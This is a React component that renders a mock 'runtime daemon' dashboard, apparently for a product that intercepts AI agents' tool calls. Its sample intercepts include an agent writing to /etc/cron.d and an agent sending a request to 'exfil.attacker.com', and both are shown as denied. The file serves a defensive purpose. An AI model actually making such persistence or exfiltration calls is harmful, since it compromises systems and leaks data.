"use client";

import { motion } from "framer-motion";

const intercepts = [
  {
    ts: "14:32:01",
    call: "write_file('/etc/cron.d/new-job')",
    agent: "sales-assistant-prod",
    rule: "deny → fs.write.system",
    verdict: "DENY",
  },
  {
    ts: "14:32:02",
    call: "execute_sql('SELECT * FROM users')",
    agent: "data-analyst-v2",
    rule: "allow → db.read.authorized",
    verdict: "ALLOW",
  },
  {
    ts: "14:32:03",
    call: "http_request('exfil.attacker.com')",
    agent: "research-bot",
    rule: "deny → net.external.unknown",
    verdict: "DENY",
  },
];

export function RedteamVisual() {
  return (
    <div className="relative w-full h-full bg-slate-950 overflow-hidden font-mono flex flex-col">
      <div
        className="absolute inset-0 pointer-events-none opacity-[0.025]"
        style={{
          backgroundImage:
            "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,255,255,0.05) 2px, rgba(255,255,255,0.05) 4px)",
        }}
      />

      {/* Header */}
      <div className="relative flex items-center justify-between px-4 py-2.5 border-b border-slate-800/50 bg-slate-900/40 shrink-0">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
          <span className="text-xs text-slate-300 tracking-wide">WYATT · RUNTIME DAEMON · ACTIVE</span>
        </div>
        <div className="flex items-center gap-3 text-[11px]">
          <span className="text-red-400">2 denied</span>
          <span className="text-green-400">1 allowed</span>
        </div>
      </div>

      {/* Intercept entries */}
      <div className="relative flex-1 px-3 py-3 flex flex-col gap-2.5 justify-center">
        {intercepts.map((item, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -14 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.35, delay: i * 0.22 }}
            className="border border-slate-800/40 bg-slate-900/30 px-3 py-2.5"
          >
            <div className="flex items-start justify-between gap-2 mb-1.5">
              <span className="text-[11px] text-slate-500 shrink-0 mt-0.5">{item.ts}</span>
              <span
                className="text-xs font-bold px-2 py-0.5 shrink-0"
                style={
                  item.verdict === "DENY"
                    ? { color: "#ef4444", backgroundColor: "rgba(239,68,68,0.1)" }
                    : { color: "#22c55e", backgroundColor: "rgba(34,197,94,0.1)" }
                }
              >
                {item.verdict}
              </span>
            </div>
            <p className="text-sm text-white/90 leading-snug truncate mb-1">{item.call}</p>
            <p className="text-[11px] text-slate-500 truncate">
              {item.agent} &nbsp;·&nbsp; {item.rule}
            </p>
          </motion.div>
        ))}
      </div>

      {/* Footer */}
      <div className="relative px-4 py-2.5 border-t border-slate-800/40 bg-slate-900/30 shrink-0 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <motion.div
            className="w-1.5 h-1.5 rounded-full bg-amber-500"
            animate={{ opacity: [1, 0.3, 1] }}
            transition={{ duration: 1.5, repeat: Infinity }}
          />
          <span className="text-[11px] text-slate-400">Deny by default · framework-agnostic</span>
        </div>
        <div className="flex items-center gap-1.5">
          <div className="w-16 h-1 bg-slate-800 overflow-hidden">
            <motion.div
              className="h-full bg-amber-500/70"
              initial={{ width: "0%" }}
              animate={{ width: "100%" }}
              transition={{ duration: 8, ease: "linear" }}
            />
          </div>
          <span className="text-[10px] text-slate-600">live</span>
        </div>
      </div>
    </div>
  );
}
